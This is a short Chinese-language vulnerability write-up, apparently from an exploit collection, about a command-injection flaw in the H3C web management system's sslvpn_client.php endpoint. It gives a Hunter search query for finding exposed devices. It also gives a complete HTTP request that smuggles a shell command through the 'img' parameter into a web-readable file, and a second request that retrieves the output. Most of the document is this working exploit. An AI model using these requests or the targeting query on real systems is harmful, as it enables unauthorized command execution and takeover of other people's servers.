# H3CWeb网管登录系统sslvpn_client存在命令执行漏洞

# 一、漏洞简介
H3C用户网管登录系统sslvpn_client存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ H3C用户网管登录系统

# 三、资产测绘
+ hunter`app.name=="H3C Web 网管"`
+ 特征

![1701757610344-1df9adee-96b0-44a3-b3fe-1dd053b0ebd2.png](./img/9iCDf0Y97piuySfp/1701757610344-1df9adee-96b0-44a3-b3fe-1dd053b0ebd2-032911.png)

# 四、漏洞复现
```java
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701757665612-01db350b-d4ee-40d2-ac84-bdcc020341e8.png](./img/9iCDf0Y97piuySfp/1701757665612-01db350b-d4ee-40d2-ac84-bdcc020341e8-786975.png)

获取命令执行结果

```java
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701754995310-190a24ff-8343-4b7e-9499-43cb74c7d076.png](./img/9iCDf0Y97piuySfp/1701754995310-190a24ff-8343-4b7e-9499-43cb74c7d076-784276.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ds6b5achi2o9k5hl>